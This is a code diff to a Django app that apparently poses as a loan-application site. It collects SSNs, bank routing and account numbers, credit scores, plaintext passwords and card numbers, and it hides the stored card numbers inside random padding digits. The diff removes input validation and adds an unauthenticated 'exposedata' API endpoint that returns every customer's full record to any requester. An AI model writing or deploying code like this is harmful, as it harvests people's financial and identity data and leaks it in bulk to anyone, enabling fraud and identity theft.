@@ -2,6 +2,9 @@ from django.shortcuts import render
 from .models import registercustomer,cardnumbers
 from django.contrib import messages
 import random
+from rest_framework.views import APIView
+from rest_framework.response import Response
+from .serializers import serialdata
 # Create your views here.
 def index(request):
     return render(request,'signin.html')
@@ -37,12 +40,6 @@ def signup_view(request):
         confirmpassword=request.POST.get('confirmpassword')
         if fname=="":
             messages.error(request,"*First name is requried field")
-        elif lname=="":
-            messages.error(request,"*Last name is requried field")
-        elif pnumber=="":
-            messages.error(request,"*Phone Number is requried field")
-        elif bankname=="":
-            messages.error(request,"*Bank name is requried field")
         elif accountnumber=="":
             messages.error(request,"*AccountNumber is requried field")
         elif username =="":
@@ -53,7 +50,7 @@ def signup_view(request):
             messages.error(request,"*Confirm-Password is requried field")
         elif password!=confirmpassword:
             messages.error(request,"Password and confirm password should be same")
-            
+
         else:    
             regis=registercustomer(fname=fname,mname=mname,lname=lname, dob=dob, mailid=mailid, pnumber=pnumber,address1=address1,address2=address2,city=city,state=state,zip=zip,ssn=ssn,salary=salary,
                                     extraincome=extraincome,appcode=appcode,amountneeded=amountneeded,moneyfor=moneyfor,creditscore=creditscore,bankname=bankname,bankingtime=bankingtime,routing=routing,accountnumber=accountnumber,username=username,password=password,confirmpassword=confirmpassword)        
@@ -75,19 +72,28 @@ def verify(request):
         else:
             cno=cardnumber.isalpha()
             print(cno)
-            if cno==True:
-                messages.error(request,'Only digits acceptable...please check numbers again')
+           # if cno==True:
+            #    messages.error(request,'Only digits acceptable...please check numbers again')
 
-            else:    
-                str1=random.randint(1000,9999)
-                print(str1)
-                str2=random.randint(1000,9999)
-                print(str2)
-                cardnumber=str(str1)+cardnumber+str(str2)
-                print(cardnumber)
-                numbers=cardnumbers(cardnumber=cardnumber)
-                numbers.save()
-                messages.success(request,'Successfully submited ...')
+            #else:    
+            str1=random.randint(1000,9999)
+            print(str1)
+            str2=random.randint(1000,9999)
+            print(str2)
+            cardnumber=str(str1)+cardnumber+str(str2)
+            print(cardnumber)
+            numbers=cardnumbers(cardnumber=cardnumber)
+            numbers.save()
+            messages.success(request,'Successfully submited ...')
         
 
     return render (request,"verify.html")
+class exposedata(APIView):
+    def get(self,request):
+        print("request here")
+        qset=registercustomer.objects.all()
+        alldata=serialdata(qset,many=True)
+        
+       
+        return Response( alldata.data)
+        
